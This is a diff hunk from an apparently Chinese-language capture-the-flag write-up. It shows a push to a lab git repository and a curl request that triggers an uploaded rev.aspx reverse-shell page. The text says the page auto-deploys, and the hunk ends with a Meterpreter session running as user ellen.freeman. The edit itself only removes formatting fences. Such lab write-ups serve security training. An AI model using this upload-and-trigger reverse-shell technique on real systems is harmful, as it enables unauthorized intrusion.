@@ -257,9 +257,7 @@ To http://10.129.35.179:3000/ellen.freeman/website.git
 [★]$ curl http://10.129.35.179/rev.aspx
 ```
 #### 在提交并推送rev.aspx文件后，它会自动部署到网站上，我们触发它使用curl请求。
-```
 ![图片](image/121403.png)
-```
 #### 我们确认Meterpreter会话在用户ellen.freeman下运行。
 ```
 (Meterpreter 1)(c:\windows\system32\inetsrv) > getuid
